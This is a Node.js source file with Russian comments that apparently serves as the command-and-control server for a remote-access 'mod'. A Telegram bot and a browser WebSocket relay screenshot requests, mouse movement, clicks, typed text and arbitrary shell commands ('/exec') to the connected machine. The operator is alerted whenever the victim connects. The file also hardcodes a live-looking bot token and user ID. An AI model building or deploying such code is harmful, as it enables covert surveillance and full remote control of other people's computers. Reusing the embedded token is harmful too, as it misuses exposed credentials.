const express = require('express');
const WebSocket = require('ws');
const { Telegraf } = require('telegraf');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

// Токен бота и твой ID (уже вставлены)
const BOT_TOKEN = '8159596204:AAFK2P-vL3fvLk_CpyUIpTsk83B7_L1XYZ4';
const YOUR_ID = 5784921257;

// WebSocket для мода
const wss = new WebSocket.Server({ noServer: true });
let clientWs = null;

wss.on('connection', (ws) => {
  console.log('Мод подключился!');
  clientWs = ws;
  // Отправляем уведомление в Telegram
  const bot = new Telegraf(BOT_TOKEN);
  bot.telegram.sendMessage(YOUR_ID, '✅ Мод подключился!').catch(() => {});

  ws.on('message', (msg) => {
    try {
      const data = JSON.parse(msg);
      if (data.type === 'screenshot') {
        global.latestScreenshot = data.data;
        // Отправляем скриншот всем браузерам
        browserWss.clients.forEach(c => {
          if (c !== ws && c.readyState === WebSocket.OPEN) {
            c.send(JSON.stringify({ type: 'screenshot', data: data.data }));
          }
        });
      }
    } catch (e) {
      // Если не JSON — значит команда от браузера, пересылаем в мод
      if (clientWs && clientWs.readyState === WebSocket.OPEN) {
        clientWs.send(msg.toString());
      }
    }
  });

  ws.on('close', () => {
    console.log('Мод отключился');
    clientWs = null;
    const bot = new Telegraf(BOT_TOKEN);
    bot.telegram.sendMessage(YOUR_ID, '❌ Мод отключился').catch(() => {});
  });
});

// WebSocket для браузера
const browserWss = new WebSocket.Server({ noServer: true });
browserWss.on('connection', (ws) => {
  console.log('Браузер подключился');
  if (global.latestScreenshot) {
    ws.send(JSON.stringify({ type: 'screenshot', data: global.latestScreenshot }));
  }
  ws.on('message', (msg) => {
    if (clientWs && clientWs.readyState === WebSocket.OPEN) {
      clientWs.send(msg.toString());
    }
  });
});

// Отдаём статику
app.use(express.static(path.join(__dirname, 'public')));

// Telegram бот
const bot = new Telegraf(BOT_TOKEN);
bot.start((ctx) => {
  ctx.reply('Бот готов! Команды:\n/screenshot\n/mouse x y\n/click left|right\n/type текст\n/exec команда');
});
bot.command('screenshot', async (ctx) => {
  if (clientWs) {
    clientWs.send(JSON.stringify({ type: 'request_screenshot' }));
    setTimeout(() => {
      if (global.latestScreenshot) {
        ctx.replyWithPhoto({ source: Buffer.from(global.latestScreenshot, 'base64') });
      } else {
        ctx.reply('Нет скриншота');
      }
    }, 600);
  } else {
    ctx.reply('Мод не подключён');
  }
});
bot.command('mouse', (ctx) => {
  const args = ctx.message.text.split(' ');
  if (args.length < 3) return ctx.reply('Использование: /mouse x y');
  const x = parseInt(args[1]), y = parseInt(args[2]);
  if (clientWs) clientWs.send(`mouse_move ${x} ${y}`);
  ctx.reply(`Мышь → (${x},${y})`);
});
bot.command('click', (ctx) => {
  const args = ctx.message.text.split(' ');
  const btn = args[1] === 'right' ? 4 : 1;
  if (clientWs) clientWs.send(`mouse_click ${btn}`);
  ctx.reply('Клик');
});
bot.command('type', (ctx) => {
  const text = ctx.message.text.replace('/type ', '');
  if (clientWs) clientWs.send(`type_text ${text}`);
  ctx.reply(`Печатаю: ${text}`);
});
bot.command('exec', (ctx) => {
  const cmd = ctx.message.text.replace('/exec ', '');
  if (clientWs) clientWs.send(`exec ${cmd}`);
  ctx.reply(`Выполнено: ${cmd}`);
});
bot.launch();

const server = app.listen(PORT, () => {
  console.log(`Сервер запущен на порту ${PORT}`);
});

// Маршрутизация WebSocket
server.on('upgrade', (req, socket, head) => {
  const pathname = new URL(req.url, `http://${req.headers.host}`).pathname;
  if (pathname === '/ws') {
    wss.handleUpgrade(req, socket, head, (ws) => wss.emit('connection', ws, req));
  } else if (pathname === '/browser') {
    browserWss.handleUpgrade(req, socket, head, (ws) => browserWss.emit('connection', ws, req));
  } else {
    socket.destroy();
  }
});